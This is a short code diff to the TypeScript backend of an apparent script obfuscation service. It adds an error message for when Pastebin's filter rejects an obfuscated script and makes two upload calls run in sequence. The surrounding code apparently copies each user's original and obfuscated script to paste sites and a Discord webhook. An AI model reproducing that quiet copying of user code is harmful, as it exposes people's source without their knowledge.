@@ -75,6 +75,9 @@ async function uploadToPastebin(content: string, title: string): Promise<{ url: 
 
   if (!res.ok || text.startsWith("Bad API request")) {
     console.error("[API-ERROR] Pastebin upload failed:", text);
+    if (text.includes("SMART filters")) {
+      throw new Error("Pastebin's automatic filter flagged this obfuscated script as suspicious and won't host it publicly. Try Rubiš or Download instead.");
+    }
     throw new Error(`Pastebin upload failed: ${text}`);
   }
 
@@ -99,10 +102,8 @@ async function uploadToAllProviders(content: string, title: string): Promise<{ r
 async function sendToDiscordWebhook(originalCode: string, obfuscatedCode: string, meta: { vmType: string; vmLevel: string }) {
   if (!DISCORD_WEBHOOK_URL) return;
   try {
-    const [originalLinks, outputLinks] = await Promise.all([
-      uploadToAllProviders(originalCode, "P20 - Original Script"),
-      uploadToAllProviders(obfuscatedCode, "P20 - Obfuscated Script"),
-    ]);
+    const originalLinks = await uploadToAllProviders(originalCode, "P20 - Original Script");
+    const outputLinks = await uploadToAllProviders(obfuscatedCode, "P20 - Obfuscated Script");
 
     const form = new FormData();
     const payload = {
